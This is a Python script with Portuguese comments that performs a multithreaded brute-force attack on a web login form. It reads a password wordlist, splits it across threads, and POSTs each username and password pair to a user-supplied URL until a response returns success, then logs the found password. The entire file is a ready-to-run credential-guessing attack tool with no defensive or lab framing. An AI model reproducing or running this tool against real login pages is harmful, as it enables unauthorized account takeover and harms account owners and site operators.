import requests
import threading
import time
import logging
from tqdm import tqdm
import os

# Configuração de log
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Número de solicitações antes de pausar
requests_before_pause = 100000

# Duração da pausa em segundos
pause_duration = 5

# Número de threads (metade do número de núcleos da CPU)
num_threads = os.cpu_count() // 2

# Limite de tentativas para evitar bloqueio (pode ser ajustado)
max_attempts = 3

# Variável compartilhada para armazenar a senha encontrada
found_password = None

# Função para fazer solicitações de autenticação
def make_auth_request(session, target_url, username, password):
    global found_password  # Acessa a variável global
    data = {"username": username, "password": password}
    attempts = 0
    while attempts < max_attempts:
        try:
            response = session.post(target_url, data=data, timeout=5)
            response.raise_for_status()  # Verifica se houve um erro na resposta

            if response.status_code == 200:
                found_password = password  # Senha correta encontrada
                return
            elif response.status_code == 401:
                logger.info(f"Senha incorreta para: {password}")
        except requests.exceptions.RequestException:
            pass
        attempts += 1

# Função para ataque de força bruta em um chunk de senhas
def brute_force_attack_chunk(target_url, username, password_chunk, progress_bar):
    session = requests.Session()

    for password in tqdm(password_chunk, desc="Testando senhas", unit=" senha", leave=False):
        if found_password:
            break  # Se a senha já foi encontrada em outra thread, encerra
        make_auth_request(session, target_url, username, password)

    progress_bar.update(len(password_chunk))

# Função principal do ataque de força bruta
def brute_force_attack(target_url, username, password_file):
    with open(password_file, "r") as file:
        passwords = file.read().splitlines()

    total_passwords = len(passwords)  # Número total de senhas a testar
    chunk_size = total_passwords // num_threads  # Tamanho do chunk por thread

    threads = []

    logger.info("Iniciando ataque de força bruta...")

    progress_bar = tqdm(total=total_passwords, desc="Testando senhas", unit=" senha")

    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size if i < num_threads - 1 else total_passwords
        password_chunk = passwords[start:end]
        thread = threading.Thread(target=brute_force_attack_chunk, args=(target_url, username, password_chunk, progress_bar))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    progress_bar.close()  # Fecha a barra de progresso

    if found_password:
        logger.info(f"Senha correta é: {found_password}")
    else:
        logger.info("Nenhuma senha válida encontrada.")

if __name__ == "__main__":
    target_url = input('Digite a URL: ')
    username = input('Digite o usuário: ')
    password_file = input('Digite o nome da wordlist: ')

    brute_force_attack(target_url, username, password_file)
